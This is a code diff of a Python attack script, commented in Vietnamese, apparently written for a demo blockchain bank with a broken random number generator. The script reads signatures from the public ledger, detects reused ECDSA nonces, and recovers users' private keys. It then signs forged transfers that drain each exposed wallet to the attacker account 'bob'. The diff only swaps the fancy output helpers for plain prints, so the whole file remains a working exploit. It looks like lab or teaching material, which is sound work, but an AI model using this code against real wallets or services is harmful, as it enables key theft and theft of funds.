@@ -1,17 +1,15 @@
 """TẤN CÔNG 1 — NONCE REUSE (qua HTTP, dùng API công khai thật).
 
-Ví mỗi người dùng có RNG hỏng nên nhiều giao dịch của họ lặp lại nonce. Từ SỔ CÁI
-công khai (/api/transactions), kẻ tấn công phát hiện các chữ ký cùng r của cùng một
-người gửi → khôi phục KHÓA RIÊNG của người đó → tự ký giao dịch rút sạch tiền của họ
-về 'bob' và nộp qua /api/tx/submit (đúng endpoint mà form chuyển tiền dùng).
+Ví hỏng RNG nên nhiều giao dịch lặp lại nonce. Từ sổ cái công khai
+(/api/transactions), phát hiện các chữ ký cùng r của cùng người gửi → khôi phục
+KHÓA RIÊNG → ký giao dịch rút sạch tiền về 'bob' qua /api/tx/submit.
 
     python attack_nonce_reuse.py
 """
 import time
 
-from common import (banner, step, info, ok, bad, impact, money,
-                    get, post, tx_bytes, hash_to_int, inverse_mod,
-                    sign_transfer, curve_from_info)
+from common import (get, post, tx_bytes, hash_to_int, inverse_mod,
+                    sign_transfer, curve_from_info, money)
 
 ATTACKER = "bob"
 
@@ -26,19 +24,16 @@ def recover_key(n, t1, t2):
 
 
 def main():
-    banner("TẤN CÔNG 1 — NONCE REUSE  →  khôi phục khóa mọi ví, rút sạch ngân hàng")
-
-    step(1, "Thu thập sổ cái công khai (GET /api/transactions) & số dư (GET /api/state)")
+    print("=== Tấn công 1: NONCE REUSE ===")
     _, txs = get("/api/transactions")
     _, state = get("/api/state")
     _, accounts = get("/api/accounts")
     balance = {a["user"]: a["balance"] for a in state["accounts"]}
     pub = {a["user"]: (int(a["pub"]["x"]), int(a["pub"]["y"])) for a in accounts}
-    # Mỗi tài khoản có thể dùng đường cong khác nhau → dựng lại đúng đường cong của họ.
     curves = {a["user"]: curve_from_info(a["curve"]) for a in accounts}
-    info("Số chữ ký thu được", len(txs))
+    print(f"Thu thập {len(txs)} chữ ký từ sổ cái công khai.")
 
-    step(2, "Nhóm chữ ký theo người gửi, tìm nonce trùng (cùng r) & khôi phục khóa")
+    # Nhóm chữ ký theo người gửi, tìm nonce trùng (cùng r) rồi khôi phục khóa.
     by_sender = {}
     for t in txs:
         by_sender.setdefault(t["from"], []).append(t)
@@ -53,28 +48,31 @@ def main():
                 d = recover_key(cu.n, seen[t["r"]], t)
                 if d and cu.mul(d, cu.G) == cu.point(*pub[u]):
                     keys[u] = (d, cu)
+                    print(f"Phát hiện nonce trùng ở '{u}' → khôi phục được khóa riêng.")
                 break
             seen[t["r"]] = t
-    ok(f"Khôi phục được khóa riêng của {len(keys)} ví (đối chiếu d·G == khóa công khai)")
+    if not keys:
+        print("Không tìm thấy ví nào lặp nonce.")
+        return
 
-    step(3, "Ký giao dịch giả rút sạch từng ví về 'bob' (POST /api/tx/submit)")
+    # Ký giao dịch giả rút sạch từng ví bị lộ khóa về 'bob'.
     stolen = 0
-    nid = state["next_id"]                     # số thứ tự giao dịch hiện tại (đồng bộ với server)
+    nid = state["next_id"]
     for u, (d, cu) in keys.items():
         amt = balance.get(u, 0)
         if amt <= 0:
             continue
         tx, r, s = sign_transfer(cu, d, u, ATTACKER, amt, nid)
-        stt, res = post("/api/tx/submit", {**tx, "r": str(r), "s": str(s)})
+        _, res = post("/api/tx/submit", {**tx, "r": str(r), "s": str(s)})
         if isinstance(res, dict) and res.get("ok"):
             stolen += amt
             nid += 1
-            ok(f"Rút {money(amt):>12} CBC từ {u} ({cu.name})")
+            print(f"Rút {money(amt)} CBC từ '{u}' về '{ATTACKER}'.")
         else:
-            bad(f"{u}: {res.get('message') if isinstance(res, dict) else res}")
+            print(f"Thất bại khi rút từ '{u}': {res.get('message') if isinstance(res, dict) else res}")
         time.sleep(0.2)
 
-    impact(f"Đã chuyển {money(stolen)} CBC về '{ATTACKER}' từ {len(keys)} ví bị lộ khóa")
+    print(f"Tổng cộng: chuyển {money(stolen)} CBC về '{ATTACKER}' từ {len(keys)} ví.")
 
 
 if __name__ == "__main__":
